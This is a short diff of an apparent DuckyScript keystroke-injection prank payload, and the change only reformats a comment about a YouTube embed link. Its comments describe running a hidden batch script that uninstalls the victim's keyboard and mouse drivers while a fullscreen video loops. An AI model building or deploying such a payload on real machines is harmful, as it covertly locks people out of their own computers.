@@ -23,8 +23,7 @@ REM     The devcon32 & devcon64 are the files used to uninstall the keyboard and
 REM     The invisible.vbs is used to run the batch script invisibly after the video is in fullscreen.
 REM     The TheRealAnnoyance.bat is the batch script run in the background that disables their mouse & keyboard.
 REM     The WebsiteLink.txt contains the website link. The user can change this as desired. Make sure there are no spaces and there is only a single link.
-REM     If you are going to modify the website link as a youtube video, it needs to be in this format: 
-https://www.youtube.com/embed/sCNrK-n68CM?rel=0&autoplay=1&loop=1
+REM     If you are going to modify the website link as a youtube video, it needs to be in this format: https://www.youtube.com/embed/sCNrK-n68CM?rel=0&autoplay=1&loop=1
 REM     Find the youtube video you want, then take the part after watch?v= and put it in place of sCNrK-n68CM in the above link.
 DELAY 3000
 CTRL ESC
